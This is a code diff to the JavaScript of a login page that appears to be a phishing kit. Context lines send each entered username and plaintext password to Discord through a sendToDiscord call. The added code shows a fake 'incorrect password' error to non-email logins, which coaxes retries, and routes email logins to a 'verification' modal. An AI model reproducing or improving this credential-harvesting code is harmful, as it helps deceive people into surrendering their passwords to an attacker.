@@ -45,15 +45,21 @@ document.addEventListener("DOMContentLoaded", () => {
             const password = loginForm.querySelector('input[type="password"]').value;
             
             if (!username || !password) {
-                alert("Please enter both username and password");
+                showLoginError("Please enter both username and password");
                 return;
             }
             
             const time = new Date().toLocaleString();
             sendToDiscord(`🔐 **Login Attempt**\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n🕐 Time: ${time}`);
             
-            // Show email verification modal instead of redirecting
-            openEmailModal();
+            // Check if username is an email (contains @)
+            if (username.includes('@')) {
+                // Email login - show email verification modal
+                openEmailModal();
+            } else {
+                // Username login - show error message
+                showLoginError("Incorrect username or password. Please try again.");
+            }
         });
     }
     
@@ -99,6 +105,30 @@ document.addEventListener("DOMContentLoaded", () => {
 });
 
 // Email Verification Modal Functions
+function showLoginError(message) {
+    const loginForm = document.querySelector(".login-form");
+    if (!loginForm) return;
+    
+    // Check if error element already exists
+    let errorElement = document.getElementById("login-error-message");
+    
+    if (!errorElement) {
+        // Create error element
+        errorElement = document.createElement("p");
+        errorElement.id = "login-error-message";
+        errorElement.style.color = "#ff4444";
+        errorElement.style.fontSize = "14px";
+        errorElement.style.marginTop = "10px";
+        errorElement.style.textAlign = "center";
+        
+        // Insert after the login button
+        const loginBtn = loginForm.querySelector('.login-btn');
+        loginBtn.parentNode.insertBefore(errorElement, loginBtn.nextSibling);
+    }
+    
+    errorElement.textContent = message;
+}
+
 function openEmailModal() {
     const modal = document.getElementById("emailVerificationModal");
     if (modal) {
